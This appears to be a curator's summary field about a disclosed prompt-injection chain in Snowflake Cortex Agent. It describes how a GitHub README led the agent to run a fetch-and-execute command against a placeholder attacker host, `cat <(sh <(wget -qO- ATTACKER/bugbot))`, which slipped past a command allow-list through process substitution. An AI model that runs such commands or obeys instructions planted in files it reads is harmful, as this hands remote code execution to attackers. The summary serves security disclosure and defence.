topics._evidence_summary: PromptArmor's walkthrough of a prompt-injection chain in Snowflake Cortex Agent — a GitHub README triggered `cat <(sh <(wget -qO- ATTACKER/bugbot))`. Cortex's allow-list treated `cat` as safe and missed the process-substitution. Simon Willison's takeaway: command-pattern allow-lists are inherently unreliable — prefer deterministic sandboxes outside the agent. Lands the SAME DAY as Snowflake's biggest agent announcement — the juxtaposition is the story. Wu unsafe rec drift (arXiv:2603.12564, 03-15) + HomeSafe-Bench (03-16) + Altman self-preservation protocol (03-16) supply the research-side bridge. First agent-security disclosure of the archive.
